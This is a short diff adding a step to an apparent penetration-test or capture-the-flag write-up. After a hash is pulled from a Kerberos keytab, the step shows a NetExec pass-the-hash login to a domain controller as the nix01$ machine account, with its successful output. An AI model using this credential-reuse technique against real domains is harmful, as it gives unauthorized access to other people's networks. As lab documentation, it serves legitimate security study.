@@ -976,5 +976,11 @@ python3 keytabextract.py ../krb5.keytab
 Looks like i have the hash of the `nix01$` machine account
 
 ```python
-
+nxc smb dc01.casper.hsm -u 'nix01$' -H '0cf15e4eee91372abddec89ec40e636e' --smb-timeout 5                                                                        
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\nix01$:0cf15e4eee91372abddec89ec40e636e
 ```
+
+This account is now compromised!
+
+
